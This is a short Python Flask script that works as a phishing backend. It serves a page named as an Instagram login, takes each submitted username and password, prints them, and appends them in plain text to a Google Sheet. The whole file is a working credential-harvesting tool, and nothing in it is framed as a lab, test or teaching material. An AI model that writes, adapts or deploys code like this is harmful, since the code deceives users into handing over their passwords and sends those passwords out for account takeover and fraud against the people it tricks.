import gspread
from oauth2client.service_account import ServiceAccountCredentials
from flask import Flask, request, render_template

app = Flask(__name__)

# Google Sheets Setup
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
creds = ServiceAccountCredentials.from_json_keyfile_name("credentials.json", scope)
client = gspread.authorize(creds)
sheet = client.open("Your Google Sheet Name").worksheet("LoginData")  # Match name exactly

@app.route("/", methods=["GET"])
def home():
    return render_template("instagram_login.html")

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        print("Username:", username)
        print("Password:", password)

        # Append to Google Sheet
        sheet.append_row([username, password])

    return render_template("instagram_login.html")

if __name__ == "__main__":
    app.run(debug=True)
